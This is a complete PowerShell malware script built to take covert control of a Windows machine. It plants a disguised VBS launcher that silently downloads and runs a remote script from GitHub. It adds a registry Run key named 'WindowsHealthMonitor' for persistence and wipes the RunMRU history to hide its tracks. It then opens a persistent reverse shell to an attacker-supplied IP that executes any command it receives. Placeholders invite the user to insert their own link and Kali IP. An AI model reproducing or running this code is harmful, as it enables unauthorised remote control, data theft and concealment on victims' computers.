# --- CONFIGURATION ---
$Url = "https://raw.githubusercontent.com/thegostman/happy/refs/heads/main/happy.ps1"  # <--- PUT YOUR RAW LINK HERE
$LHOST = "192.168.43.109"       # <--- PUT YOUR KALI IP HERE
$LPORT = 4444

# --- 1. CREATE THE INVISIBLE LAUNCHER (VBS) ---
# We save this file to a hidden system folder so the user never sees it
$FileName = "system_update.vbs"
$Path = "$env:APPDATA\Microsoft\Windows\Templates\$FileName"

# This VBS code does two things:
# 1. It waits 60 seconds at startup (to let Wi-Fi connect).
# 2. It runs PowerShell completely invisibly (WindowStyle 0).
$VBSCode = @"
WScript.Sleep(60000)
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command IEX(New-Object Net.WebClient).DownloadString('$Url')", 0, False
"@

# Write the VBS file to the disk
Set-Content -Path $Path -Value $VBSCode -Force

# --- 2. PERSISTENCE (Run the VBS, not PowerShell) ---
# We point the registry to 'wscript.exe' which runs VBS files silently
$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$Name = "WindowsHealthMonitor"
$Value = "wscript.exe `"$Path`""

Set-ItemProperty -Path $RegPath -Name $Name -Value $Value

# --- 3. CLEANUP (Hide tracks) ---
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue

# --- 4. IMMEDIATE CONNECTION (The Beacon Loop) ---
# This runs immediately so you don't have to wait for a reboot
while($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush = $true
        $writer.WriteLine("--- TARGET CONNECTED (VBS INSTALLED) ---")
        $reader = New-Object System.IO.StreamReader($stream)
        
        while($client.Connected) {
            $writer.Write("PS " + (Get-Location).Path + "> ")
            $line = $reader.ReadLine()
            if($line -eq "exit") { break }
            $out = (Invoke-Expression $line 2>&1 | Out-String)
            $writer.WriteLine($out)
        }
        $client.Close()
    }
    catch { Start-Sleep -Seconds 10 }
}
